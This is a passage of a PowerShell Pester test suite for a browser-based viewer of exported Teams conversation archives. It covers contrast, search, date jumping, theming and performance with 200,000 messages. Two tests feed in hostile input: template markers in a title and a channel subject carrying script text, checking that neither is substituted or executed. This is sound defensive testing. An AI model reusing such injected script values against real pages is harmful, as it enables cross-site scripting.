  function bgOf(e){while(e){var c=parse(getComputedStyle(e).backgroundColor);if(c&&c.a>0.95)return c;e=e.parentElement;}return {r:255,g:255,b:255,a:1};}
  function lum(c){function f(v){v/=255;return v<=0.03928?v/12.92:Math.pow((v+0.055)/1.055,2.4);}return 0.2126*f(c.r)+0.7152*f(c.g)+0.0722*f(c.b);}
  function ratio(a,b){var x=lum(a),y=lum(b);return (Math.max(x,y)+0.05)/(Math.min(x,y)+0.05);}
  var sels={topTitle:'.brand b',topSub:'.brand small',listSecondary:'.li .l2',listDate:'.li .date',cardSecondary:'.bubble .meta time',cardAuthor:'.bubble .meta .au',pillCount:'.rx span',pillMine:'.rx span.mine',system:'.sys',daySep:'.daysep span',tab:'.chead .tab',fileSub:'.file .fs',link:'.body a',mention:'.mention:not(.me)'};
  var out={};
  Object.keys(sels).forEach(function(k){var e=document.querySelector(sels[k]);if(!e){out[k]=null;return;}var fg=parse(getComputedStyle(e).color);out[k]=Math.round(ratio(fg,bgOf(e))*100)/100;});
  return JSON.stringify(out);
})()
"@
            foreach ($scheme in 'light', 'dark') {
                Set-TestViewport -Width 1440 -Height 900 -Scheme $scheme
                Open-TestPage -Url ((Get-FileUrl (Join-Path $script:DemoFolder 'index.html')) + '#c=c2') | Out-Null
                Wait-TestPage 'TT.api.stats().rendered > 3 && !document.querySelector("#rows .skel")' | Out-Null
                $r = (Get-TestValue $js) | ConvertFrom-Json -AsHashtable
                foreach ($k in $r.Keys) { if ($null -ne $r[$k]) { $r[$k] | Should -BeGreaterOrEqual 4.5 -Because "$k in $scheme" } }
                $r['topTitle'] | Should -Not -BeNullOrEmpty
                $r['listSecondary'] | Should -Not -BeNullOrEmpty
                $r['pillCount'] | Should -Not -BeNullOrEmpty
                if ($scheme -eq 'dark') {
                    Get-TestValue 'getComputedStyle(document.querySelector(".top")).backgroundColor' | Should -Be 'rgb(43, 43, 43)'   # a dark bar, the accent is only for indicators
                }
            }
            Set-TestViewport -Width 1440 -Height 900 -Scheme light
        }
        It 'slash focuses the search box and Alt+Down opens the next conversation' {
            Get-TestValue 'document.dispatchEvent(new KeyboardEvent("keydown",{key:"/",bubbles:true})); document.activeElement.id' | Should -Be 'q'
            $before = Get-TestValue 'TT.api.stats().conv'
            Get-TestValue 'document.activeElement.blur(); document.dispatchEvent(new KeyboardEvent("keydown",{key:"ArrowDown",altKey:true,bubbles:true})); TT.api.stats().conv' | Should -Not -Be $before
        }
        It 'the jump-to-date field is a text input that takes YYYY-MM-DD whatever the browser locale' {
            Get-TestValue 'TT.api.open("c2"); 1' | Out-Null
            Start-Sleep -Milliseconds 500
            Get-TestValue 'document.getElementById("jumpDate").type' | Should -Be 'text'
            Get-TestValue 'document.getElementById("jumpDate").placeholder' | Should -Be 'YYYY-MM-DD'
            $enter = 'var d=document.getElementById("jumpDate"); d.value=VALUE; d.dispatchEvent(new KeyboardEvent("keydown",{key:"Enter",bubbles:true})); return d.classList.contains("bad")'
            foreach ($bad in '15/01/2026', '2026-02-30', '2026-1-5', 'tomorrow') {
                Get-TestValue ('(function(){' + $enter.Replace('VALUE', ($bad | ConvertTo-Json -Compress)) + '})()') | Should -BeTrue -Because $bad
            }
            Get-TestValue ('(function(){' + $enter.Replace('VALUE', '"2026-01-15"') + '})()') | Should -BeFalse
        }
        It 'toggles the theme and the language' {
            Get-TestValue 'document.getElementById("btnTheme").click(); document.documentElement.getAttribute("data-theme")' | Should -Be 'light'
            Get-TestValue 'document.getElementById("btnTheme").click(); document.documentElement.getAttribute("data-theme")' | Should -Be 'dark'
            Get-TestValue 'document.documentElement.lang' | Should -Be 'en'
            Get-TestValue 'document.getElementById("tabTeams").textContent' | Should -Be 'Teams'
            Get-TestValue 'document.getElementById("btnTheme").click(); document.documentElement.hasAttribute("data-theme")' | Should -BeFalse
        }
        It 'searches the current conversation and across all conversations, accent and case insensitive' {
            Get-TestValue 'TT.api.open("c2"); TT.api.search("MOCKUPS").then(function(){ return document.querySelectorAll("#hits .hit").length })' | Should -Be 1
            Get-TestValue 'document.getElementById("scope").value="all"; document.getElementById("scope").dispatchEvent(new Event("change")); TT.api.search("WELCOME LEA").then(function(){ return document.querySelectorAll("#hits .hit").length })' | Should -BeGreaterThan 0
            Get-TestValue 'TT.api.search("zzzz-missing").then(function(){ return document.getElementById("sideProg").textContent })' | Should -Match 'No result'
        }
        It 'opens a hit in its conversation and highlights it' {
            Get-TestValue 'TT.api.search("staging").then(function(){ document.querySelector("#hits .hit").click(); return new Promise(function(r){ setTimeout(function(){ r(document.querySelectorAll("#rows mark").length) }, 800) }) })' | Should -BeGreaterThan 0
        }
        It 'collapses channel replies by default and expands them on click' {
            Get-TestValue 'document.getElementById("q").value=""; TT.api.search(""); TT.api.open("c3"); 1' | Out-Null
            Start-Sleep -Milliseconds 600
            Get-TestValue 'document.querySelectorAll("#rows .reply").length' | Should -Be 0
            Get-TestValue 'document.querySelectorAll("#rows .tbtn").length' | Should -BeGreaterThan 0
            Get-TestValue 'document.querySelector("#rows .tbtn").click(); 1' | Out-Null
            Start-Sleep -Milliseconds 400
            Get-TestValue 'document.querySelectorAll("#rows .reply").length' | Should -BeGreaterThan 0
        }
        It 'does not substitute template markers found in user data (title containing {{SCRIPT}})' {
            $o = Join-Path $script:Out 'marker'
            [void](Export-TmtArchive -Store $script:DemoReader -OutputPath $o -Users 'camille.martin@contoso.com' -Title 'x {{SCRIPT}} {{CSP}} y')
            Open-TestPage -Url (Get-FileUrl (Join-Path $o 'index.html')) | Out-Null
            Get-TestValue 'document.title' | Should -Be 'x {{SCRIPT}} {{CSP}} y'
            Get-TestValue 'TT.api.stats().total' | Should -Be 0   # no conversation opened yet: the page itself is healthy
        }
    }

    Context 'hostile channel subject' {
        It 'renders the subject of a post as text only' {
            Set-TestViewport -Width 1440 -Height 3000
            $ch = $script:ChannelConvs | Select-Object -First 1
            Open-TestPage -Url ((Get-FileUrl (Join-Path $script:Tiny1 'index.html')) + '#c=' + $ch.id) | Out-Null
            $found = $false
            foreach ($c in $script:ChannelConvs) {
                Get-TestValue "TT.api.open('$($c.id)'); 1" | Out-Null
                Start-Sleep -Milliseconds 500
                if ((Get-TestValue 'document.getElementById("rows").textContent') -match 'window\.__pwned="subject"') { $found = $true; break }
            }
            $found | Should -BeTrue
            Get-TestValue 'String(window.__pwned)' | Should -Be 'undefined'
        }
    }
}

Describe 'Archive: virtualization with 200 000 messages' -Skip:(-not $script:HasBrowser) {
    BeforeAll {
        $script:BigDir = Join-Path $script:Out 'big'
        $big = [TeamsTransfer.Testing.LargeConversationReader]::new(200000)
        $sw = [Diagnostics.Stopwatch]::StartNew()
        $script:BigResult = Export-TmtArchive -Store $big -OutputPath $script:BigDir
        $script:GenSeconds = $sw.Elapsed.TotalSeconds
        Write-Host ("  [perf] generated 200000 messages in {0:N1} s: {1} chunks, {2:N1} MB" -f $script:GenSeconds, $script:BigResult.Chunks, ($script:BigResult.OutputBytes / 1MB))
        [void](Start-TestBrowser -Width 1440 -Height 900)
        $script:BigUrl = (Get-FileUrl (Join-Path $script:BigDir 'index.html')) + '#c=c1'
    }
    AfterAll { Stop-TestBrowser }

    It 'generates many chunks, none larger than 2000 items' {
        $script:BigResult.Messages | Should -Be 200000
        $script:BigResult.Chunks | Should -BeGreaterThan 90
        $m = (Get-Manifest (Join-Path $script:BigDir 'index.html')) | ConvertFrom-Json
        ($m.conversations[0].chunks | Measure-Object n -Maximum).Maximum | Should -BeLessOrEqual 2000
    }
    It 'opens the conversation at its last message quickly with a small DOM' {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        Open-TestPage -Url $script:BigUrl | Out-Null
        Wait-TestPage 'TT.api.stats().rendered > 3 && !document.querySelector("#rows .skel") && document.querySelectorAll("#rows .bubble").length > 3' -TimeoutSec 60 | Out-Null
        $ms = $sw.ElapsedMilliseconds
        $s = Get-TestValue 'JSON.stringify(TT.api.stats())' | ConvertFrom-Json
        Write-Host ("  [perf] open 200k conversation: ready in {0} ms, DOM nodes {1}, rendered items {2}, chunks loaded {3}" -f $ms, $s.nodes, $s.rendered, $s.loaded)
        $ms | Should -BeLessThan 15000
        $s.total | Should -Be 200000
        $s.nodes | Should -BeLessThan 3500
        $s.rendered | Should -BeLessThan 120
        $s.loaded | Should -BeLessOrEqual 3
        Get-TestValue 'document.getElementById("msgs").scrollHeight > 100000' | Should -BeTrue
    }
    It 'stays light after jumping around and scrolling through many chunks (chunks are evicted)' {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        Get-TestValue 'TT.api.goTo(100000).then(function(){return 1})' -TimeoutSec 60 | Out-Null
        Start-Sleep -Milliseconds 500
        $jump = $sw.ElapsedMilliseconds
        $s = Get-TestValue 'JSON.stringify(TT.api.stats())' | ConvertFrom-Json
        Write-Host ("  [perf] jump to the middle: {0} ms, DOM nodes {1}, rendered {2}" -f $jump, $s.nodes, $s.rendered)
        $s.nodes | Should -BeLessThan 3500
        $jump | Should -BeLessThan 10000
        # walk through the conversation: 60 big scroll steps
        $js = '(async function(){ var b=document.getElementById("msgs"); var maxLoaded=0, maxNodes=0; for (var i=0;i<60;i++){ b.scrollTop = b.scrollTop + 40000; await new Promise(function(r){setTimeout(r,120)}); var s=TT.api.stats(); maxLoaded=Math.max(maxLoaded,s.loaded); maxNodes=Math.max(maxNodes,s.nodes);} return JSON.stringify({maxLoaded:maxLoaded,maxNodes:maxNodes}); })()'
        $walk = Get-TestValue $js -TimeoutSec 120 | ConvertFrom-Json
        Write-Host ("  [perf] 60 scroll steps: max chunks loaded {0}, max DOM nodes {1}" -f $walk.maxLoaded, $walk.maxNodes)
        $walk.maxLoaded | Should -BeLessOrEqual 26
        $walk.maxNodes | Should -BeLessThan 4000
    }
    It 'jumps to a date and finds messages with the search index' {
        $ts = [DateTimeOffset]::new(2026, 1, 15, 0, 0, 0, [TimeSpan]::Zero).ToUnixTimeMilliseconds()
        Get-TestValue "TT.api.jump($ts).then(function(){return 1})" -TimeoutSec 60 | Out-Null
        Start-Sleep -Milliseconds 700
        $nearMs = Get-TestValue '(function(){var top=document.getElementById("msgs").getBoundingClientRect().top;var its=document.querySelectorAll("#rows .item");for(var i=0;i<its.length;i++){if(its[i].getBoundingClientRect().bottom>top+20){var t=its[i].querySelector("time");return t?new Date(t.getAttribute("datetime")).getTime():null;}}return null;})()'
        $nearMs | Should -BeGreaterOrEqual $ts
        $nearMs | Should -BeLessThan ($ts + 3600000)
        $q = 'Point 1000'
        Get-TestValue "document.getElementById('scope').value='conv'; document.getElementById('q').value='$q'; TT.api.search('$q').then(function(){return 1})" -TimeoutSec 120 | Out-Null
        Start-Sleep -Milliseconds 500
        (Get-TestValue 'document.querySelectorAll("#hits .hit").length') | Should -BeGreaterThan 0
    }
}
